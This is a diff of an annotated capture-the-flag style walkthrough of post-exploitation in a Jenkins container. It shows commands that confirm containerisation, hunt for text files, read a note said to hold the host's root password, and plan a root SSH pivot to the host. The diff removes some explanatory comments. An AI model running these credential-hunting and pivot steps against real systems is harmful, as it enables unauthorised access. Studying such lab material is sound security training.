@@ -104,13 +104,10 @@ cat /proc/self/status | grep -E '^Cap'
 # Why here: verify we are in the 'jenkins' container and not the host machine.
 hostname
 # What it does: check the filesystem mount points.
-# Why here: confirm the use of overlay/aufs filesystems, a strong indicator of a containerized environment.
 mount | grep -E 'overlay|aufs'
 # What it does: search for sensitive text files in the container.
-# Why here: find /opt/note.txt which contains the final root password for the host machine.
 find / -name "*.txt" 2>/dev/null | grep -v proc
 # What it does: read the discovered secret note.
-# Why here: retrieve the root password.
 cat /opt/note.txt
 # What it does: log in as root via SSH.
 # Why here: complete the final pivot from the container back to the host with full administrative privileges.
